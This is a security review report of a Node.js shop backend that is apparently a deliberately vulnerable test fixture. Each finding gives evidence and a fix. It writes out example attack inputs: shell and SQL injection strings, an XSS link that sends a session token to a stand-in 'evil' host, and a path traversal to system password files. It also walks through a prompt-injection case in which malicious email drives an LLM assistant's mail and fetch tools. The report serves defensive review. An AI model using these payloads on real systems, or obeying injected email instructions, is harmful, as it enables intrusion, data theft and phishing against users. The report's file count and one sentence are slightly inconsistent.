# Security Review: ShopLite (tests/fixtures/vuln-app)

**Date:** 2026-10-08
**Scope:** Full static review of the ShopLite application in `tests/fixtures/vuln-app/` — all 13 files: `src/server.js`, `src/auth.js`, `src/db.js`, `src/users.js`, `src/uploads.js`, `src/payments.js`, `src/graphql.js`, `src/ai.js`, `public/app.js`, `package.json`, `.env`, `Dockerfile`, `docker-compose.yml`, `terraform/main.tf`. Static analysis only: nothing was executed, installed, or contacted.
**Stack:** Node.js 20 (ESM), Express 4.18, PostgreSQL via `pg` 8.11, `jsonwebtoken` 8.5.1 (JWT auth), `multer` 1.4.5-lts.1 (uploads), `express-graphql` 0.12 / `graphql` 16.8 (GraphQL API with GraphiQL), `openai` 4.20 (LLM inbox assistant with tools), `nodemailer` (SMTP), `node-serialize` 0.0.4 (legacy sessions), `moment` 2.29.4; Docker + docker-compose (app + Postgres 16); Terraform/AWS security groups.

## Executive Summary

ShopLite is a small e-commerce backend with severe, systemic security weaknesses: an unauthenticated OS command injection, an unauthenticated SQL injection in an admin endpoint, a GraphQL API with no authorization at all, and live secrets committed to git and baked into source and container images. Authentication and session handling are also weak (unsalted MD5 passwords, a hardcoded JWT secret, a `SameSite=None` non-HttpOnly cookie), and the LLM inbox assistant executes model-chosen tools (email sending, arbitrary URL fetching) driven by untrusted email content. The application should be treated as fully compromised from an internet-facing deployment perspective; the findings below include four critical issues that each independently lead to remote code execution or mass data exposure.

**Finding Counts:**
- Critical: 4
- High: 11
- Medium: 11
- Low: 3
- Informational: 2

## Since Last Review

Baseline review — no prior report found.

## Critical and High Findings

### [SR-001] [CRITICAL] [Unauthenticated OS command injection in diagnostics endpoint]

**Location:** `src/server.js:33`
**Category:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
`GET /api/ping` interpolates the `host` query parameter directly into a `child_process.exec()` template literal. `exec()` runs its argument through `/bin/sh`, so any shell metacharacter (`;`, `&&`, `` ` ` ``, `$()`, newline) achieves arbitrary command execution. The route is registered before any authentication middleware and never uses `requireAuth`, so it is reachable by any unauthenticated caller. The comment "Diagnostics page for support" does not change reachability. Successful exploitation is full remote code execution as the container user (root — see SR-026).

**Evidence:**
```
31: // Diagnostics page for support
32: app.get('/api/ping', (req, res) => {
33:   exec(`ping -c 1 ${req.query.host}`, (err, stdout, stderr) => {
```
Example request shape (not executed): `GET /api/ping?host=127.0.0.1;id`.

**Remediation:**
Remove the endpoint, or if ping diagnostics are genuinely required, avoid a shell entirely and validate the input as a strict hostname/IP:
```js
import { spawn } from 'child_process';

app.get('/api/ping', requireAuth, requireRole('support'), (req, res) => {
  const host = req.query.host ?? '';
  if (!/^[a-zA-Z0-9.-]{1,253}$/.test(host) || host.includes('..')) {
    return res.status(400).json({ error: 'Invalid host' });
  }
  const p = spawn('ping', ['-c', '1', '-w', '2', host]); // no shell, argv-safe
  // ... collect bounded output, timeout, and require authentication
});
```

**References:** CWE-78; OWASP A03:2021 Injection; Node.js `child_process` security notes.

### [SR-002] [CRITICAL] [Unauthenticated SQL injection in admin user listing]

**Location:** `src/users.js:17`
**Category:** CWE-89 (SQL Injection)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
`GET /api/admin/users` interpolates `req.query.sort` into the `ORDER BY` clause with a template literal. Two independent problems: (1) the endpoint has no `requireAuth` middleware and no role check despite its name — anyone can call it; (2) the query text with no parameter array is sent via Postgres' simple query protocol in `node-postgres`, which permits stacked statements, so `?sort=id;UPDATE users SET role='admin'` or `;DROP TABLE ...` executes arbitrary SQL. Even without stacking, the injectable position enables boolean/error-based extraction of the entire database (emails, MD5 password hashes — SR-011 — order data). No validation, allowlist, or middleware guard exists anywhere on this path.

**Evidence:**
```
15:   app.get('/api/admin/users', async (req, res) => {
16:     const sort = req.query.sort || 'id';
17:     const { rows } = await query(`SELECT id, email, role FROM users ORDER BY ${sort}`);
```

**Remediation:**
Allowlist the sort column and require admin authorization:
```js
const SORTABLE = { id: 'id', email: 'email', role: 'role' };
app.get('/api/admin/users', requireAuth, requireRole('admin'), async (req, res) => {
  const sort = SORTABLE[req.query.sort] ?? 'id';
  const dir = req.query.order === 'desc' ? 'DESC' : 'ASC';
  const { rows } = await query(
    `SELECT id, email, role FROM users ORDER BY ${sort} ${dir}` // interpolated from allowlist only
  );
  res.json(rows);
});
```

**References:** CWE-89; OWASP A03:2021 Injection; OWASP SQL Injection Prevention Cheat Sheet (ORDER BY cannot be parameterized — allowlist).

### [SR-003] [CRITICAL] [GraphQL API has no authentication or object-level authorization; GraphiQL enabled]

**Location:** `src/graphql.js:21`
**Category:** CWE-862 (Missing Authorization) / CWE-639 (BOLA)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
The `/graphql` endpoint is mounted with no authentication middleware. Both resolvers take arbitrary identifiers and return order data with no ownership check: `order(id)` fetches any order by id, and `orders(user_id)` returns **every order for any user** to any anonymous caller. This is mass exfiltration of all customers' order history and totals (payment behavior, purchase patterns). Additionally, `graphiql: true` exposes an interactive query console, and the schema has no query depth/complexity limits. There is no guard anywhere in the file or in `server.js` before `registerGraphQL(app)`.

**Evidence:**
```
13: const root = {
14:   order: ({ id }) =>
15:     query('SELECT * FROM orders WHERE id = $1', [id]).then((r) => r.rows[0]),
16:   orders: ({ user_id }) =>
17:     query('SELECT * FROM orders WHERE user_id = $1', [user_id]).then((r) => r.rows),
18: };
19:
20: export function registerGraphQL(app) {
21:   app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true }));
22: }
```

**Remediation:**
- Apply `requireAuth` before the GraphQL handler and enforce object ownership in every resolver: `order` must add `AND user_id = $2` with `req.user.sub` (or return admin-only), and `orders` must ignore the client-supplied `user_id` and use the authenticated subject (unless an admin role check passes).
- Set `graphiql: false` (or gate it on `NODE_ENV !== 'production'`).
- Add depth/complexity limits (e.g. `graphql-depth-limit`, `graphql-cost-analysis`).

```js
app.use('/graphql', requireAuth, graphqlHTTP((req) => ({
  schema, rootValue: rootWithUser(req), graphiql: false,
  validationRules: [depthLimit(7)],
})));
```

**References:** CWE-862, CWE-639; OWASP API Security Top 10 API1 (BOLA); OWASP GraphQL Security Cheat Sheet.

### [SR-004] [CRITICAL] [Production secrets committed to git, hardcoded in source, and baked into images]

**Location:** `.env:1-4`, `src/auth.js:6`, `src/ai.js:6`, `docker-compose.yml:7,12`
**Category:** CWE-798 (Use of Hard-coded Credentials)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
Live-looking secrets are stored in four places: (1) `.env` is **tracked in git** (confirmed via `git ls-files`; no `.gitignore` covers it) and contains a `sk_live_` Stripe key, an OpenAI API key, the database password, and the JWT signing secret; (2) the JWT secret is additionally hardcoded as a string literal in `src/auth.js`; (3) the OpenAI key is additionally hardcoded in `src/ai.js`; (4) the database password is inline in `docker-compose.yml`. Anyone with repo read access (or the published image — `COPY . .` includes `.env`, see SR-026) can forge arbitrary admin JWTs (`{role: "admin"}`), drain the Stripe account, use the OpenAI account, and connect to the database (which Terraform exposes to the internet, SR-025). All values are exposed in source and must be rotated. Values below are redacted per reporting rules.

**Evidence:**
```
.env:1: DATABASE_URL=postgres://shoplite:p0st…pass@db:5432/shoplite
.env:2: JWT_SECRET=j8s3…2b9c
.env:3: STRIPE_SECRET_KEY=sk_l…9x2q
.env:4: OPENAI_API_KEY=sk-p…x2q7

src/auth.js:6:  export const JWT_SECRET = 'j8s3…2b9c';   // redacted
src/ai.js:6:    const client = new OpenAI({ apiKey: 'sk-p…x2q7' }); // redacted

docker-compose.yml:7:   - DATABASE_URL=postgres://shoplite:p0st…pass@db:5432/shoplite
docker-compose.yml:12:      POSTGRES_PASSWORD: p0st…pass
```

**Remediation:**
1. **Rotate every exposed credential immediately** — Stripe key, OpenAI key, JWT secret, DB password. Rotation is mandatory; deleting the files is not sufficient.
2. Purge `.env` from git history (`git filter-repo` or BFG) since it was committed before any ignore rule existed.
3. Load secrets only from the environment or a secret manager; add `.gitignore` entries for `.env*` and commit only a `.env.example` with placeholder values.
4. Remove hardcoded keys from `auth.js`/`ai.js` (`process.env.JWT_SECRET`, `process.env.OPENAI_API_KEY`).
5. Use compose `env_file`/secrets or `docker secret` instead of inline passwords.
6. Enable GitHub push protection and run `gitleaks detect` / `trufflehog` in CI (scanner recommendations — not run per rules of engagement).

**References:** CWE-798; OWASP A02:2021 Cryptographic Failures (plaintext secrets); OWASP Secrets Management Cheat Sheet.

### [SR-005] [HIGH] [SQL injection via column names and mass assignment in PUT /api/me]

**Location:** `src/users.js:41-45`
**Category:** CWE-89 (SQL Injection) + CWE-915 (Mass Assignment)
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
`PUT /api/me` builds the `SET` clause from `Object.keys(req.body)` — user-controlled **identifiers** interpolated into SQL. A key such as `"role" = $1` performs privilege escalation (set your own `role` to `admin`), and crafted keys containing SQL syntax inject into the statement. Values are parameterized, but identifiers are not — they cannot be, so they must be allowlisted. Any authenticated user can become admin or manipulate the query shape; combined with `RETURNING *` the response also echoes the modified row.

**Evidence:**
```
40:   app.put('/api/me', requireAuth, async (req, res) => {
41:     const fields = Object.keys(req.body).map((k, i) => `${k} = $${i + 1}`).join(', ');
42:     const values = Object.values(req.body);
43:     const { rows } = await query(
44:       `UPDATE users SET ${fields} WHERE id = $${values.length + 1} RETURNING *`,
45:       [...values, req.user.sub]
46:     );
```
Attack body (not executed): `PUT /api/me` with `{"role": "admin"}` or `{"email = 'x' WHERE 1=1 --": "y"}`.

**Remediation:**
Allowlist updatable fields and reject everything else:
```js
const UPDATABLE = ['display_name', 'email'];
const entries = Object.entries(req.body).filter(([k]) => UPDATABLE.includes(k));
if (entries.length !== Object.keys(req.body).length) {
  return res.status(400).json({ error: 'Invalid fields' });
}
const fields = entries.map(([k], i) => `"${k}" = $${i + 1}`).join(', ');
// ... values from entries only; never accept role/is_admin/password fields here
```
Sensitive columns (`role`, `password_hash`) must only be changeable through dedicated, separately authorized admin endpoints.

**References:** CWE-89, CWE-915; OWASP Mass Assignment Cheat Sheet.

### [SR-006] [HIGH] [IDOR: any user can read any other user's orders]

**Location:** `src/users.js:10-13`
**Category:** CWE-639 (IDOR) / CWE-862
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
`GET /api/users/:id/orders` applies `requireAuth` but then queries with the URL-supplied `id` instead of the authenticated subject. Any logged-in user can enumerate `id` values (sequential integers, per the GraphQL `Int` schema) and read every customer's full order history. Note the contrast with the correct pattern two routes above (`/api/me/orders` uses `req.user.sub`).

**Evidence:**
```
10:   app.get('/api/users/:id/orders', requireAuth, async (req, res) => {
11:     const { rows } = await query('SELECT * FROM orders WHERE user_id = $1', [req.params.id]);
12:     res.json(rows);
13:   });
```

**Remediation:**
Bind the query to the authenticated user, or check ownership/admin role explicitly:
```js
app.get('/api/users/:id/orders', requireAuth, async (req, res) => {
  if (Number(req.params.id) !== req.user.sub && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // ... proceed
});
```

**References:** CWE-639; OWASP API1:2023 (BOLA); OWASP Access Control Cheat Sheet.

### [SR-007] [HIGH] [SSRF: link preview fetches arbitrary server-side URLs]

**Location:** `src/users.js:22-27`
**Category:** CWE-918 (Server-Side Request Forgery)
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
`POST /api/preview` passes `req.body.url` directly to server-side `fetch()` with no scheme, host, or IP validation and no redirect handling (fetch follows redirects by default, defeating any check-time validation). An attacker can reach cloud metadata endpoints (`http://169.254.169.254/...`), internal services (`smtp.internal` is resolvable from the app), loopback services, and internal admin panels, and read the response title (the regex extracts `<title>`, giving a limited read primitive; response status/timing also leak). Note this is reachable by any authenticated user, and SR-001/SR-002 provide unauthenticated equivalents — this SSRF matters especially in internal-network deployments.

**Evidence:**
```
21:   // Link preview used by the share dialog
22:   app.post('/api/preview', requireAuth, async (req, res) => {
23:     const r = await fetch(req.body.url);
24:     const html = await r.text();
25:     const title = html.match(/<title>(.*)<\/title>/)?.[1];
```

**Remediation:**
- Parse the URL server-side; require `https:`.
- Validate the resolved IP against blocklists (loopback `127.0.0.0/8`, link-local `169.254.0.0/16` including metadata, private ranges `10/8, 172.16/12, 192.168/16`, IPv6 equivalents, `::1`, `fc00::/7`) **at connect time**, ideally by pinning the resolved address.
- Disable or constrain redirect following (`redirect: 'manual'` plus re-validation per hop).
- Consider an outbound proxy/egress allowlist at the network layer.

**References:** CWE-918; OWASP SSRF Prevention Cheat Sheet; SSRF Bible (metadata IP encodings).

### [SR-008] [HIGH] [Unrestricted file type on upload served same-origin enables stored XSS]

**Location:** `src/uploads.js:9-14` (with `src/server.js:51`)
**Category:** CWE-434 (Unrestricted Upload of File with Dangerous Type) / CWE-79
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
The avatar upload keeps the client-supplied original extension (`path.extname(req.file.originalname)`) with no extension or content-type allowlist and no magic-byte check. Uploaded files are renamed into `uploads/` and served back by `express.static` on the **same origin** with no authentication (`app.use('/uploads', express.static('uploads'))` in `server.js:51`), and the attacker effectively controls the served `Content-Type` via the extension. Uploading `.html` or `.svg` (SVG can embed `<script>`) yields stored XSS running on the app origin — where `localStorage` holds session tokens (SR-024), giving account takeover. No `Content-Disposition: attachment` or `X-Content-Type-Options: nosniff` mitigates this. Multer is also configured with no file size limits.

**Evidence:**
```
uploads.js:9:   app.post('/api/uploads/avatar', requireAuth, upload.single('avatar'), (req, res) => {
uploads.js:10:    const ext = path.extname(req.file.originalname);
uploads.js:11:    const target = `uploads/${req.user.sub}${ext}`;
uploads.js:12:    fs.renameSync(req.file.path, target);
server.js:51:    app.use('/uploads', express.static('uploads'));
```

**Remediation:**
- Allowlist image extensions (`.jpg`, `.jpeg`, `.png`, `.webp`) and validate magic bytes (e.g. `file-type`), reject everything else including `.svg`.
- Serve uploads from a separate origin or cookie-less CDN domain with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, or force `Content-Type: application/octet-stream`.
- Set multer `limits: { fileSize: 2 * 1024 * 1024, files: 1 }`.

**References:** CWE-434; OWASP Unrestricted File Upload; MDN: SVG security.

### [SR-009] [HIGH] [Stored XSS via profile bio rendered with innerHTML]

**Location:** `public/app.js:12`
**Category:** CWE-79 (Stored XSS)
**Confidence:** Likely
**Exploitability:** Requires chaining

**Description:**
The web client renders `profile.bio` with `innerHTML`. Bio/profile fields are user-settable (PUT `/api/me` accepts arbitrary updatable-looking fields, SR-005), so HTML/script in a bio executes in any viewer's session. With the session token in `localStorage` (SR-024) and no CSP (SR-028), this is account takeover of anyone who views the profile. Marked **Likely** rather than Confirmed because the server-side route the client fetches (`GET /api/users/:id`) does not exist in the reviewed code — the sink pattern and data flow are confirmed, but end-to-end reachability depends on that endpoint shipping as implied by the client.

**Evidence:**
```
app.js:9:    const profile = await profileRes.json();
app.js:12:   document.getElementById('bio').innerHTML = profile.bio;
app.js:13:   document.getElementById('orders').innerHTML = orders
app.js:14:     .map((o) => `<div class="order">Order #${o.id}: $${o.total}</div>`)
```

**Remediation:**
Never use `innerHTML` for user data:
```js
document.getElementById('bio').textContent = profile.bio ?? '';
```
Sanitize on render if rich text is truly required (DOMPurify), and add a CSP as defense in depth. (Note `renderUserName` at `app.js:26-30` already uses `textContent` correctly — apply that pattern everywhere.)

**References:** CWE-79; OWASP XSS Prevention Cheat Sheet Rule 7 (HTML sinks).

### [SR-010] [HIGH] [Reflected XSS in /welcome]

**Location:** `src/server.js:41`
**Category:** CWE-79 (Reflected XSS)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
`GET /welcome` reflects `req.query.name` into an HTML string via `res.send()` without any encoding. Express does not escape template literals. A crafted link (`/welcome?name=<script>fetch('//evil/'+localStorage.session_token)</script>`) executes attacker JavaScript on the app origin in any victim's browser. No CSP is set (SR-028), so no mitigation exists. Impact is amplified by the token being stored in `localStorage` (SR-024), making this a direct account-takeover primitive against authenticated users who click the link.

**Evidence:**
```
39: // Marketing landing page
40: app.get('/welcome', (req, res) => {
41:   res.send(`<h1>Welcome back, ${req.query.name}!</h1>`);
42: });
```

**Remediation:**
Encode on output (e.g. `const esc = require('html-escaper')` / a small entity encoder), or use a template engine with auto-escaping:
```js
app.get('/welcome', (req, res) => {
  const name = String(req.query.name ?? '').slice(0, 100);
  res.send(`<h1>Welcome back, ${escapeHtml(name)}!</h1>`);
});
```
Add a Content-Security-Policy header as a second layer (SR-028).

**References:** CWE-79; OWASP A03:2021 Injection (XSS).

### [SR-011] [HIGH] [Passwords hashed with unsalted MD5]

**Location:** `src/auth.js:8-10`
**Category:** CWE-916 (Password Hash Without Sufficient Work Factor) / CWE-327
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
`hashPassword` uses `crypto.createHash('md5')` with no salt. MD5 is fast and broken for this purpose; modern GPUs compute billions of MD5 guesses per second, and rainbow tables cover unsalted hashes. Any database disclosure — trivially available via SR-002 — recovers most user passwords in minutes, and password reuse spreads the damage to other sites. MD5 here also violates PCI-DSS and NIST 800-63B password-storage requirements.

**Evidence:**
```
auth.js:8:  export function hashPassword(password) {
auth.js:9:    return crypto.createHash('md5').update(password).digest('hex');
auth.js:10: }
```

**Remediation:**
Migrate to Argon2id (preferred) or bcrypt with a proper work factor, rehashing on next successful login:
```js
import argon2 from 'argon2';
const hash = await argon2.hash(password, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2 });
// verify: await argon2.verify(row.password_hash, password)
```
Store `algorithm + params` with each hash (the encoded format does this) so future migrations are possible; force reset for dormant accounts.

**References:** CWE-916; NIST SP 800-63B §5.1.1.2; OWASP Password Storage Cheat Sheet.

### [SR-012] [HIGH] [Path traversal in file download endpoint]

**Location:** `src/uploads.js:16-18`
**Category:** CWE-22 (Path Traversal)
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
`GET /api/downloads/:filename` builds a path from the URL parameter with no normalization check: `path.resolve(`uploads/${req.params.filename}`)`. Express URL-decodes route params, so `/api/downloads/..%2f..%2fetc%2fpasswd` resolves outside `uploads/` and `res.sendFile` returns any file readable by the process. The app runs as root in the container (SR-026) and `COPY . .` places the committed `.env` (SR-004) at `/app/.env` — so this reads the Stripe key, OpenAI key, JWT secret, and DB password, plus `/etc/shadow` and any other OS file. Only a `../` literal check is absent entirely — there is no sanitization of any kind.

**Evidence:**
```
uploads.js:16:  app.get('/api/downloads/:filename', requireAuth, (req, res) => {
uploads.js:17:    res.sendFile(path.resolve(`uploads/${req.params.filename}`));
uploads.js:18:  });
```

**Remediation:**
Resolve and contain:
```js
const root = path.resolve('uploads');
const target = path.resolve(root, req.params.filename);
if (!target.startsWith(root + path.sep)) return res.status(403).json({ error: 'Forbidden' });
res.sendFile(target);
```
Better: key files by server-generated IDs (a DB lookup of `id → filename`) so client input never touches the filesystem path, and reject any input containing `/`, `\`, or `..`.

**References:** CWE-22; OWASP Path Traversal Cheat Sheet.

### [SR-013] [HIGH] [Server stores client-supplied order total]

**Location:** `src/payments.js:5-10`
**Category:** CWE-840 (Business Logic Errors) / CWE-602
**Confidence:** Confirmed
**Exploitability:** Requires authentication

**Description:**
`POST /api/checkout` destructures `total` from the request body and inserts it as the order total verbatim. Prices are never computed server-side from SKUs, quantities are unvalidated (negative/zero accepted), there is no stock check, and no currency handling. Any authenticated user can buy a $900 cart for `$0.01` (or a negative total) — direct financial loss requiring nothing but a modified request. The per-item loop also runs outside a transaction, so partial failure leaves inconsistent orders.

**Evidence:**
```
payments.js:5:   app.post('/api/checkout', requireAuth, async (req, res) => {
payments.js:6:     const { items, total } = req.body;
payments.js:7:     const { rows } = await query(
payments.js:8:       'INSERT INTO orders (user_id, total) VALUES ($1, $2) RETURNING *',
payments.js:9:       [req.user.sub, total]
```

**Remediation:**
Accept only `{ sku, qty }` items with validated integers; look up prices server-side; compute the total in a transaction:
```js
// inside a db transaction:
//  SELECT sku, price FROM products WHERE sku = ANY($1) FOR UPDATE
//  total = sum(price * qty) — computed server-side only
//  validate qty >= 1, check stock, then INSERT order + items atomically
```
Bind the charge amount to the order server-side when calling the payment provider; never read monetary values from the client.

**References:** CWE-840; OWASP A04:2021 Insecure Design (client-trusted business values).

### [SR-014] [HIGH] [LLM inbox assistant: indirect prompt injection drives unscoped email and fetch tools]

**Location:** `src/ai.js:51-65`
**Category:** OWASP LLM Top 10 LLM01 (Prompt Injection) / LLM06 (Excessive Agency); CWE-1427
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
The inbox assistant loads the user's emails — untrusted content — into a prompt that explicitly instructs the model to "take whatever actions are needed, including replying or following links the emails request". A malicious email is therefore an injection vector with system-level tools attached: `send_email` sends mail **as `assistant@shoplite.example`** (a trusted internal domain — perfect phishing amplification, e.g. credential-reset lures to the user's contacts) with no per-tool authorization, no rate limits, and no human confirmation; `fetch_page` fetches model-chosen URLs with no allowlist — SSRF with LLM-controlled destinations (cloud metadata, internal hosts, same risks as SR-007). Tool results are also `console.log`ged, potentially writing retrieved internal content into logs. This is textbook excessive agency: untrusted instructions and privileged actions in the same trust domain.

**Evidence:**
```
ai.js:51:    const prompt =
ai.js:52:      'You are the inbox assistant. Read these emails and take whatever actions are needed, ' +
ai.js:53:      'including replying or following links the emails request:\n\n' +
ai.js:54:      rows.map((e) => `From: ${e.sender}\n${e.body}`).join('\n---\n');
...
ai.js:62:    for (const call of completion.choices[0].message.tool_calls || []) {
ai.js:63:      const result = await runTool(call.function.name, JSON.parse(call.function.arguments));
```

**Remediation:**
- Treat email content as data, not instructions: use prompt structure that separates untrusted content from the instruction channel, and design the assistant as summarize/classify-only by default.
- Gate irreversible/external-effect tools (`send_email`) behind human-in-the-loop confirmation and per-tool authorization checks.
- Restrict `fetch_page` to an allowlisted domain set with the same SSRF controls as SR-007.
- Bound the tool loop (max calls, max spend, timeout) and never log full tool results containing retrieved content.

**References:** OWASP Top 10 for LLM Applications (LLM01, LLM06); OWASP LLM Agent Threat Guide.

### [SR-015] [HIGH] [node-serialize deserialization primitive on cookie input (legacy path)]

**Location:** `src/auth.js:31-34` (dependency at `package.json:18`)
**Category:** CWE-502 (Deserialization of Untrusted Data)
**Confidence:** Likely
**Exploitability:** Theoretical

**Description:**
`parseLegacySession` base64-decodes a cookie value and passes it to `node-serialize`'s `unserialize()`. That library executes `_$$ND_FUNC$$_` payloads (IIFE trick) during deserialization — a well-known remote-code-execution primitive; `node-serialize` 0.0.4 is abandoned and has no fixed version. **Verification result:** a repo-wide search shows this export is not referenced by any route today, so it is not currently reachable — hence Theoretical exploitability rather than Confirmed. It is retained and exported as a "legacy session format kept for the v1 mobile app," i.e. one future route-wiring away from unauthenticated RCE, and the dangerous dependency ships in the manifest regardless.

**Evidence:**
```
auth.js:31: // Legacy session format kept for the v1 mobile app
auth.js:32: export function parseLegacySession(cookieValue) {
auth.js:33:   return serialize.unserialize(Buffer.from(cookieValue, 'base64').toString());
auth.js:34: }
package.json:18:   "node-serialize": "0.0.4",
```

**Remediation:**
Delete the function and remove `node-serialize` from dependencies. Legacy sessions should be migrated to signed, opaque tokens (or re-issued), never parsed with a code-executing serializer. If arbitrary structured data must cross the wire, use `JSON.parse` (no function revival) plus schema validation.

**References:** CWE-502; node-serialize is a known RCE-via-unserialize vector (e.g. CVE-2017-16063 class); OWASP Deserialization Cheat Sheet.

## Medium and Low Findings

### [SR-016] [MEDIUM] [Password reset tokens generated with Math.random]

**Location:** `src/auth.js:36-38`
**Category:** CWE-340 (Predictable from Observable State) / CWE-338
**Confidence:** Likely
**Exploitability:** Theoretical

**Description:**
`generateResetToken` builds a reset token from two `Math.random().toString(36)` slices. `Math.random()` is not cryptographically secure; its output can be predicted from observed values (V8's PRNG state is recoverable). If a future route uses this for password resets, tokens become guessable → account takeover for arbitrary users. **Verification result:** no route currently invokes this export (repo-wide search), so exploitability is Theoretical — but the helper exists for exactly this purpose and the pattern must not ship.

**Evidence:**
```
auth.js:36: export function generateResetToken() {
auth.js:37:   return Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
auth.js:38: }
```

**Remediation:**
```js
import crypto from 'crypto';
const token = crypto.randomBytes(32).toString('base64url'); // or crypto.randomUUID()
```
Store only a hash of the token with a short expiry and single-use semantics.

**References:** CWE-340; Node.js docs: `Math.random()` is not cryptographically secure.

### [SR-017] [MEDIUM] [CORS allows any origin with credentials]

**Location:** `src/server.js:15`
**Category:** CWE-942 (Overly Permissive CORS Policy)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
`cors({ origin: '*', credentials: true })` advertises that every origin may call the API with credentials. Browsers reject `Access-Control-Allow-Origin: *` on credentialed (cookie) responses, which partially masks the issue, but the configuration signals intent to reflect arbitrary origins: non-credentialed cross-origin reads of API responses work from any site, and any refactor to permissive origin-reflection turns this into full cross-site data access. Combined with the token-cookie scheme it materially widens CSRF/origin-confusion exposure (SR-018).

**Evidence:**
```
server.js:15: app.use(cors({ origin: '*', credentials: true }));
```

**Remediation:**
Allowlist exact origins and drop credentials where not needed:
```js
app.use(cors({
  origin: (origin, cb) =>
    ['https://shoplite.example', 'https://app.shoplite.example'].includes(origin)
      ? cb(null, true) : cb(new Error('Not allowed by CORS')),
  credentials: true,
}));
```

**References:** CWE-942; OWASP CORS Misconfiguration; MDN CORS documentation.

### [SR-018] [MEDIUM] [No CSRF protection anywhere; session cookie disables SameSite]

**Location:** `src/auth.js:50` (cookie) and all state-changing routes (`src/users.js:30-48`, `src/payments.js:5-31`, `src/server.js:19`)
**Category:** CWE-352 (Cross-Site Request Forgery)
**Confidence:** Confirmed
**Exploitability:** Requires chaining (victim visit)

**Description:**
Every state-changing endpoint (login, profile update, checkout, coupon redeem, `/api/me` PUT) lacks CSRF tokens, and no CSRF middleware exists anywhere in the codebase. Worse, the session cookie is set with `sameSite: 'none'` — which **requires** cross-site sending — plus `secure: false` (also invalid per spec for SameSite=None; browsers that enforce it will reject or downgrade). Any website can therefore trigger authenticated POSTs with the victim's cookie: change the victim's account email via `/api/profile` (prelude to password-reset takeover), place orders, or burn coupons. Login CSRF (forging a session into the attacker's account) is also possible since `/api/login` sets the cookie without any CSRF defense. Note `/api/profile` is the cookie-authenticated route, so it is fully CSRF-exposed; the Bearer-token routes are not CSRFable via cookie but share the missing token hygiene.

**Evidence:**
```
auth.js:50:   res.cookie('session', token, { httpOnly: false, secure: false, sameSite: 'none' });
```

**Remediation:**
- Set `sameSite: 'lax'` (or `'strict'`), `secure: true`, `httpOnly: true` on the session cookie.
- Add CSRF middleware for cookie-authenticated state-changing routes (double-submit token or `csurf`-style synchronized token; Origin/Referer validation as a fallback).
- Keep the token in an Authorization header (already supported by `requireAuth`) rather than a cookie for API clients.

**References:** CWE-352; OWASP CSRF Prevention Cheat Sheet.

### [SR-019] [MEDIUM] [Error handler leaks stack traces and SQL to clients]

**Location:** `src/server.js:53-56`
**Category:** CWE-209 (Information Exposure Through Error Message)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
The global error handler returns `err.message`, `err.stack`, and `err.query` (the actual SQL text, exposed by `node-postgres` query errors) in the HTTP response. Any request that triggers a database error — trivial via SR-002/SR-005 — discloses internal file paths, library versions, and full SQL statements, supercharging injection development. `DEBUG=true` in the committed `.env` compounds the verbose-diagnostics posture.

**Evidence:**
```
server.js:53: app.use((err, req, res, next) => {
server.js:54:   console.error(err);
server.js:55:   res.status(500).json({ error: err.message, stack: err.stack, query: err.query });
server.js:56: });
```

**Remediation:**
Return an opaque message; log details server-side with a correlation id:
```js
app.use((err, req, res, _next) => {
  const id = crypto.randomUUID();
  req.log?.error({ err, id });          // structured server-side logging only
  res.status(500).json({ error: 'Internal server error', correlationId: id });
});
```

**References:** CWE-209; OWASP A05:2021 Security Misconfiguration.

### [SR-020] [MEDIUM] [Plaintext passwords written to logs on failed login]

**Location:** `src/auth.js:46`
**Category:** CWE-532 (Insertion of Sensitive Information into Log File)
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
On failed login the handler logs the submitted plaintext password (`console.log('failed login', { email, password })`). Log systems are widely read (aggregators, support tooling, bug reports, third-party log SaaS) and rarely access-controlled like databases — this turns every typo'd or attacker-guessed password into a durable record. Combined with password reuse this directly leaks credentials for other sites. `ai.js:64` similarly logs tool results which can include fetched internal content.

**Evidence:**
```
auth.js:45:   if (!match) {
auth.js:46:     console.log('failed login', { email, password });
auth.js:47:     return res.status(401).json({ error: 'Wrong password' });
```

**Remediation:**
Log only non-sensitive context: `console.warn('failed login', { email, ip: req.ip })` — never the password, token, or credential material. Scrub sensitive keys centrally (e.g. pino redaction) as defense in depth.

**References:** CWE-532; OWASP Logging Cheat Sheet (credentials must never be logged).

### [SR-021] [MEDIUM] [Coupon redemption race condition (TOCTOU)]

**Location:** `src/payments.js:22-31`
**Category:** CWE-367 (Time-of-check Time-of-use Race Condition)
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
Redeem performs `SELECT` (check `coupon.redeemed`), then a separate `UPDATE` to mark redeemed. Two concurrent requests both pass the check and both succeed — a single-use code can be redeemed N times concurrently, and the same non-atomic pattern applies to any limited-quantity business rule. No transaction, row lock, or atomic conditional update is used.

**Evidence:**
```
payments.js:23:    const { rows } = await query('SELECT * FROM coupons WHERE code = $1', [req.params.code]);
payments.js:24:    const coupon = rows[0];
payments.js:25:    if (!coupon || coupon.redeemed) return res.status(400).json({ error: 'Coupon invalid' });
payments.js:26:    await query("UPDATE coupons SET redeemed = true, redeemed_by = $1 WHERE id = $2", [
```

**Remediation:**
Make the check-and-set atomic:
```sql
UPDATE coupons
   SET redeemed = true, redeemed_by = $1
 WHERE id = $2 AND redeemed = false
RETURNING value;
```
Treat zero affected rows as "already redeemed". Wrap multi-step financial flows in transactions with `SELECT ... FOR UPDATE`.

